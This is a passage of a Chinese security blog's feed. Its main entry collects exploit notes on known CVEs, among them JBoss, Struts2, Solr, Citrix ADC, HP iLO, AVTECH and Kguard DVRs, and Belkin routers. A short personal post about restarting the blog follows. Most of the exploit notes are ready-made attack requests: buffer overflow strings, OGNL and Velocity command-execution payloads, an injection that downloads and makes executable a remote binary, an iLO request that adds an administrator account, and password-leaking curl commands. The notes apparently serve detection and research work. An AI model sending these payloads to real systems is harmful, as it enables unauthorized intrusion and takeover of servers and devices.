class="line">action=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA*Ԍ�CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC*�@;;;;;;;;;;;;;;;;;;;;;;;;wget http://1.1.1.1&amp;txtUserId=a&amp;button=Login&amp;txtPassword=a&amp;sle_Language=english</span><br></pre></td></tr></table></figure><h4 id="reference-1"><a href="#reference-1" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.exploit-db.com/exploits/44074">https://www.exploit-db.com/exploits/44074</a></p><h3 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h3><h4 id="description-2"><a href="#description-2" class="headerlink" title="description"></a>description</h4><p>CVE-2017-12149 - JBoss 5.x/6.x 反序列化漏洞</p><ul><li>该漏洞出现在 <strong>/invoker/readonly</strong> 请求中，服务器将用户提交的POST内容进行了Java反序列化。<br>直接将序列化数据作为POST body发送至/invoker/readonly即可</li></ul><p>CVE-2017-7504 - JBoss 4.x JBossMQ JMS 反序列化漏洞</p><ul><li>该漏洞出现在 <strong>/jbossmq-httpil/HTTPServerILServlet</strong> 中，直接把序列化数据POST。</li></ul><p>CVE-2015-7501 - JMXInvokerServlet 反序列化漏洞</p><ul><li>该漏洞出现在 <strong>/invoker/JMXInvokerServlet</strong> 中，与前一个类似。</li></ul><p>jmx-console 和 web-console</p><ul><li><strong>/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.system:type=ServerInfo</strong></li><li><strong>/web-console/ServerInfo.jsp</strong></li></ul><h4 id="reference-2"><a href="#reference-2" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/vulhub/vulhub/tree/master/jboss">https://github.com/vulhub/vulhub/tree/master/jboss</a><br><a href="https://www.exploit-db.com/exploits/36575">https://www.exploit-db.com/exploits/36575</a></p><h3 id="CVE-2018-11776-Apache-Struts2-S2-057"><a href="#CVE-2018-11776-Apache-Struts2-S2-057" class="headerlink" title="CVE-2018-11776 - Apache Struts2 S2-057"></a>CVE-2018-11776 - Apache Struts2 S2-057</h3><h4 id="description-3"><a href="#description-3" class="headerlink" title="description"></a>description</h4><p><a href="https://github.com/mazen160/struts-pwn_CVE-2018-11776">struts-pwn_CVE-2018-11776</a>使用数值计算的方式进行check。其首先生成一个随机数比如93，然后构造<code>$&#123;&#123;93*93&#125;&#125;</code> 替换url的一部分。</p><blockquote><p>以<code>http://example.com/demo/struts2-showcase/index.action</code>为例，会构造三个注入点依次测试：<br><code>http://example.com/$&#123;&#123;93*93&#125;&#125;/index.action</code><br><code>http://example.com/demo/$&#123;&#123;93*93&#125;&#125;/index.action</code><br><code>http://example.com/demo/struts2-showcase/$&#123;&#123;93*93&#125;&#125;/index.action</code></p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/$%7B%7B93*93%7D%7D/index.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User-Agent</span>: struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)</span><br></pre></td></tr></table></figure><p>如果响应的Location字段返回了数值计算即93*93的结果则存在漏洞。根据注入点<br>构造payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&lt;----PAYLOAD----&gt;%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/index.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User-Agent</span>: struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)</span><br></pre></td></tr></table></figure><h4 id="reference-3"><a href="#reference-3" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/mazen160/struts-pwn_CVE-2018-11776">https://github.com/mazen160/struts-pwn_CVE-2018-11776</a></p><h3 id="HomeMatic-Zentrale-CCU2-RCE"><a href="#HomeMatic-Zentrale-CCU2-RCE" class="headerlink" title="HomeMatic Zentrale CCU2 RCE"></a>HomeMatic Zentrale CCU2 RCE</h3><h4 id="description-4"><a href="#description-4" class="headerlink" title="description"></a>description</h4><p>首先向 <strong>/api/backup/version.cgi</strong> 发送GET请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/backup/version.cgi</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: identity</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">User-Agent</span>: Python-urllib/2.7</span><br></pre></td></tr></table></figure><p>如果返回了VERSION=x.x.x则继续发送payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/backup/logout.cgi?sid=aa&quot;);system.Exec(&quot;wget+-O+/tmp/exploit+http://127.0.0.1:1234/exploit&amp;&amp;chmod+%2bx+/tmp/exploit&quot;);system.ClearSessionID(&quot;bb</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: identity</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">User-Agent</span>: Python-urllib/2.7</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="reference-4"><a href="#reference-4" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.exploit-db.com/exploits/45052">https://www.exploit-db.com/exploits/45052</a></p><h3 id="CVE-2019-0192-amp-CVE-2019-0193-Apache-Solr-RCE"><a href="#CVE-2019-0192-amp-CVE-2019-0193-Apache-Solr-RCE" class="headerlink" title="CVE-2019-0192 &amp; CVE-2019-0193- Apache Solr RCE"></a>CVE-2019-0192 &amp; CVE-2019-0193- Apache Solr RCE</h3><h4 id="description-5"><a href="#description-5" class="headerlink" title="description"></a>description</h4><p>CVE-2019-0192</p><ol><li>GET请求 <strong>/solr/admin/cores?wt=json</strong> ，如果响应中包含 <strong>status</strong> 字段如{“status”:{“abcdefgh”:”1”},}，则存在cores节点</li><li>之后向 <strong>/solr/abcdefgh/config</strong> 发送POST请求。</li></ol><p>CVE-2019-0193</p><ol><li>GET请求 <strong>/solr/admin/cores</strong> ，跟上一个类似的是响应中包含 <strong>status</strong> 字段则存在cores节点。</li><li>GET请求 <strong>/solr/admin/info/system</strong> ，获取响应中 <strong>system</strong> 字段的 <strong>name</strong> 、 <strong>uname</strong> 和 <strong>version</strong> 。</li><li>POST请求 <strong>/solr/abcdefgh/config</strong> —— init node config。</li><li>GET请求<code>/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27&lt;-----command-----&gt;%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</code>执行任意代码。</li></ol><h4 id="reference-5"><a href="#reference-5" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/Imanfeng/Apache-Solr-RCE">https://github.com/Imanfeng/Apache-Solr-RCE</a><br><a href="https://github.com/mpgn/CVE-2019-0192/blob/master/CVE-2019-0192.py">https://github.com/mpgn/CVE-2019-0192/blob/master/CVE-2019-0192.py</a><br><a href="https://www.exploit-db.com/exploits/47572">https://www.exploit-db.com/exploits/47572</a></p><h3 id="Belkin-N600DB-Multiple-Vulnerabilities"><a href="#Belkin-N600DB-Multiple-Vulnerabilities" class="headerlink" title="Belkin N600DB - Multiple Vulnerabilities"></a>Belkin N600DB - Multiple Vulnerabilities</h3><h4 id="description-6"><a href="#description-6" class="headerlink" title="description"></a>description</h4><p>Disclore wifi password:<br><code>curl --silent &quot;http://192.168.2.1/langchg.cgi&quot;</code> , <code>curl --silent &quot;http://192.168.2.1/adv_wifidef.cgi&quot;</code><br>Closed “HTTPD server” port:<br><code>curl --silent &quot;http://192.168.2.1/removepwd.cgi&quot; --data &quot;&quot;</code><br>Web Backdoor:<br><code>http://192.168.2.1/dev.htm</code><br>Server-Side Request Forgery (HTTP/FTP):<br><code>curl --silent &quot;http://192.168.2.1/proxy.cgi?chk&amp;url=http://45.33.32.156/&quot;</code><br>Command Injection:<br><code>curl --silent &quot;http://192.168.2.1/proxy.cgi?chk&amp;url=--help&quot;</code></p><h4 id="reference-6"><a href="#reference-6" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.exploit-db.com/exploits/43682">https://www.exploit-db.com/exploits/43682</a></p><h3 id="AVTECH-DVR-multiple-vulnerabilities"><a href="#AVTECH-DVR-multiple-vulnerabilities" class="headerlink" title="AVTECH DVR multiple vulnerabilities"></a>AVTECH DVR multiple vulnerabilities</h3><h4 id="description-7"><a href="#description-7" class="headerlink" title="description"></a>description</h4><p>在AVTHCH AVN801 DVR中发现了多个漏洞：</p><ol><li>CVE-2013-4980：通过利用RTSP数据包处理程序中的缓冲区溢出来执行任意代码<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SETUP Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2AaLSaLS RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: VLC media player (LIVE555 Streaming Media v2010.02.10)</span><br></pre></td></tr></table></figure></li><li>CVE-2013-4981：通过特制的HTTP POST请求利用 <strong>/cgi-bin/user/Config.cgi</strong> 中的缓冲区溢出来执行任意代码<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/user/Config.cgi?action=set&amp;Network.SMTP.Receivers=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: identity</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br></pre></td></tr></table></figure></li><li>CVE-2013-4982：绕过管理登录控制台的验证码，启用多个automated attack vectors。uri中有 <strong>/cgi-bin/nobody/VerifyCode.cgi</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;cgi-bin&#x2F;nobody&#x2F;VerifyCode.cgi?account&#x3D;YWRtaW46YWRtaW4&#x3D;&amp;captcha_code&#x3D;FMUA&amp;verify_code&#x3D;FMUYyLOivRpgc HTTP&#x2F;1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Accept-Encoding: identity</span><br></pre></td></tr></table></figure></li></ol><h4 id="reference-7"><a href="#reference-7" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.coresecurity.com/core-labs/advisories/avtech-dvr-multiple-vulnerabilities">https://www.coresecurity.com/core-labs/advisories/avtech-dvr-multiple-vulnerabilities</a></p><h3 id="CVE-2017-12542"><a href="#CVE-2017-12542" class="headerlink" title="CVE-2017-12542"></a>CVE-2017-12542</h3><h4 id="description-8"><a href="#description-8" class="headerlink" title="description"></a>description</h4><p>iLO 全名是 Integrated Lights-out，它是惠普某些型号的服务器上集成的远程管理端口，它能够允许用户基于不同的操作系统从远端管理服务器。iLO 4中的CVE-2017-12542可以允许未经身份验证的远程攻击者绕过验证并执行任意代码。<br>当uri等于 <strong>/rest/v1/Accountservice/Accounts</strong> 且HTTP Headers中的Connection字段大于等于29个字符时即可绕过验证。在exp中如果收到的json中没有error和Items字段则认为漏洞存在。<br>向目标post添加用户的数据包，且Connection仍然大于等于29个字符，即可成功添加用户。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/rest/v1/accountservice/accounts</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.19.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 253</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;UserName&quot;: &quot;admin&quot;, &quot;Password&quot;: &quot;admin123&quot;, &quot;Oem&quot;: &#123;&quot;Hp&quot;: &#123;&quot;Privileges&quot;: &#123;&quot;RemoteConsolePriv&quot;: true, &quot;iLOConfigPriv&quot;: true, &quot;VirtualMediaPriv&quot;: true, &quot;UserConfigPriv&quot;: true, &quot;VirtualPowerAndResetPriv&quot;: true, &quot;LoginPriv&quot;: true&#125;, &quot;LoginName&quot;: &quot;admin&quot;&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="reference-8"><a href="#reference-8" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/skelsec/CVE-2017-12542/blob/master/exploit_1.py">https://github.com/skelsec/CVE-2017-12542/blob/master/exploit_1.py</a><br><a href="https://www.freebuf.com/vuls/167124.html">https://www.freebuf.com/vuls/167124.html</a></p><h3 id="CVE-2019-19781"><a href="#CVE-2019-19781" class="headerlink" title="CVE-2019-19781"></a>CVE-2019-19781</h3><h4 id="description-9"><a href="#description-9" class="headerlink" title="description"></a>description</h4><p>Citrix ADC的RCE漏洞。在 <strong>/vpns/</strong> 路径中有一个目录遍历漏洞。</p><ul><li>首先通过POST请求通过目录遍历漏洞创建恶意XML，payload包含在POST data中<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/vpn/../vpns/portal/scripts/newbm.pl</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">NSC_USER</span>: ../../../netscaler/portal/templates/sobxivwokx</span><br><span class="line"><span class="attribute">NSC_NONCE</span>: 7</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 97</span><br><span class="line"></span><br><span class="line">url=127.0.0.1&amp;title=[% template.new(&#123;&#x27;BLOCK&#x27;=&#x27;print readpipe( xxxx )&#x27;&#125;)%]&amp;desc=desc&amp;UI_inuse=a</span><br></pre></td></tr></table></figure></li><li>然后通过GET请求去执行payload<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/vpn/../vpns/portal/sobxivwokx.xml</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">NSC_USER</span>: dgxgvoankd</span><br><span class="line"><span class="attribute">NSC_NONCE</span>: 7</span><br></pre></td></tr></table></figure></li></ul><h4 id="reference-9"><a href="#reference-9" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/MalwareTech/CitrixHoneypot/blob/master/CitrixHoneypot.py">https://github.com/MalwareTech/CitrixHoneypot/blob/master/CitrixHoneypot.py</a><br><a href="https://github.com/trustedsec/cve-2019-19781">https://github.com/trustedsec/cve-2019-19781</a><br><a href="https://github.com/jas502n/CVE-2019-19781">https://github.com/jas502n/CVE-2019-19781</a><br><a href="https://www.jianshu.com/p/03b175711524">https://www.jianshu.com/p/03b175711524</a><br><a href="https://www.anquanke.com/post/id/197074?native.theme=2">https://www.anquanke.com/post/id/197074?native.theme=2</a></p><h3 id="Kguard-SHA104-SHA108-Bypass-Command-Injection"><a href="#Kguard-SHA104-SHA108-Bypass-Command-Injection" class="headerlink" title="Kguard SHA104 / SHA108 Bypass / Command Injection"></a>Kguard SHA104 / SHA108 Bypass / Command Injection</h3><h4 id="description-10"><a href="#description-10" class="headerlink" title="description"></a>description</h4><p>sha104和sha108都是Kguard公司的数字硬盘录像机，在处理身份验证和授权方面存在缺陷。例如，请求HI_SRDK_SYS_USERMNG_GetUserList会显示所有的用户名和密码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">REMOTE HI_SRDK_SYS_USERMNG_GetUserList MCTP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 6</span><br><span class="line"><span class="attribute">Accept</span>: text/HDP</span><br><span class="line"><span class="attribute">Content-Type</span>: text/HDP</span><br><span class="line"><span class="attribute">Func-Version</span>: 0x10</span><br><span class="line"><span class="attribute">Content-Length</span>: 51</span><br><span class="line"><span class="attribute">3Segment-Num</span>: 1</span><br><span class="line"><span class="attribute">Segment-Seq</span>: 1</span><br><span class="line"><span class="attribute">Data-Length</span>: 4</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">VMCTP/1.0 200 OK</span><br><span class="line"><span class="attribute">Content-Type</span>: text/HDP</span><br><span class="line"><span class="attribute">CSeq</span>: 6</span><br><span class="line"><span class="attribute">Return-Code</span>: 0</span><br><span class="line"><span class="attribute">Content-Length</span>: 2326</span><br><span class="line"><span class="attribute">Segment-Num</span>: 2</span><br><span class="line"><span class="attribute">Segment-Seq</span>: 1</span><br><span class="line"><span class="attribute">Data-Length</span>: 2240</span><br><span class="line"><span class="attribute">eric</span></span><br><span class="line"><span class="attribute">111222</span></span><br><span class="line"><span class="attribute">111222</span></span><br><span class="line"><span class="attribute">admin</span></span><br><span class="line"><span class="attribute">111222</span></span><br><span class="line"><span class="attribute">111222</span></span><br></pre></td></tr></table></figure><p>特征是在Request中的HTTP版本部分是 <strong>MCTP</strong> 。另外还可以进行更改用户密码等操作。</p><h4 id="reference-10"><a href="#reference-10" class="headerlink" title="reference"></a>reference</h4><p><a href="https://cxsecurity.com/issue/WLB-2015030061">https://cxsecurity.com/issue/WLB-2015030061</a></p><h3 id="IBM-QRadar-SIEM-Unauthenticated-Remote-Code-Execution"><a href="#IBM-QRadar-SIEM-Unauthenticated-Remote-Code-Execution" class="headerlink" title="IBM QRadar SIEM Unauthenticated Remote Code Execution"></a>IBM QRadar SIEM Unauthenticated Remote Code Execution</h3><h4 id="description-11"><a href="#description-11" class="headerlink" title="description"></a>description</h4><p>uri:  <strong>/ForensicsAnalysisServlet/</strong><br>在第二个链接中有具体的利用过程。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ForensicsAnalysisServlet/?action=someaction</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Cookie</span>: SEC=owned; QRadarCSRF=superowned;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line">&#123;&quot;exceptionMessageValue&quot;:&quot;javax.servlet.ServletException: No valid forensics analysis solrDocIds parameter found.&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="reference-11"><a href="#reference-11" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.exploit-db.com/exploits/45005">https://www.exploit-db.com/exploits/45005</a><br><a href="https://ssd-disclosure.com/ssd-advisory-qradar-remote-command-execution/">https://ssd-disclosure.com/ssd-advisory-qradar-remote-command-execution/</a></p><h3 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h3><p>docker, es, hbase, hadoop, phpadmin, cms, couchdb, orientdb, upnp, ipmi, rpc, a2billing, boa</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;CVE-2020-5902-F5-BIG-IP-Remote-Code-Execution&quot;&gt;&lt;a href=&quot;#CVE-2020-5902-F5-BIG-IP-Remote-Code-Execution&quot; class=&quot;headerlink&quot; title=&quot;CV</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Back to blog</title>
    <link href="http://woodpile27.cn/2020/08/08/hello-world/"/>
    <id>http://woodpile27.cn/2020/08/08/hello-world/</id>
    <published>2020-08-08T00:00:00.000Z</published>
    <updated>2020-09-15T10:24:06.548Z</updated>
    
    <content type="html"><![CDATA[<p>今天换了id，把原来的github.io项目给删了，要重新开始写博客啦~</p><h3 id="Why-restart"><a href="#Why-restart" class="headerlink" title="Why restart"></a>Why restart</h3><p>如果没有记错的话，上次写博客还是大二的时候，写博客本就是个好习惯，但是自己没能坚持下来。前不久wenji师傅请我吃饭时，强烈建议我养成记笔记或者写博客的习惯，把自己平时遇到的问题以及解决方法进行记录，可以提高自己的文字表达能力，而博客更是一个很好的展示自己的平台。我深以为然，决定开始养成这个习惯，逐渐把它变成”例行公事”。</p><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>借用老板在这周开会时说的两句话吧：<strong>是否觉得在做的事情有意思？是否给部门带来了价值？</strong><br>弗洛伊德认为，people are comfortably numb，大多数人都活在舒适的麻木中。我们应该培育自己的积极性和激情。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天换了id，把原来的github.io项目给删了，要重新开始写博客啦~&lt;/p&gt;
&lt;h3 id=&quot;Why-restart&quot;&gt;&lt;a href=&quot;#Why-restart&quot; class=&quot;headerlink&quot; title=&quot;Why restart&quot;&gt;&lt;/a&gt;Why resta</summary>
      
    
    
    
    
  </entry>
  
</feed>
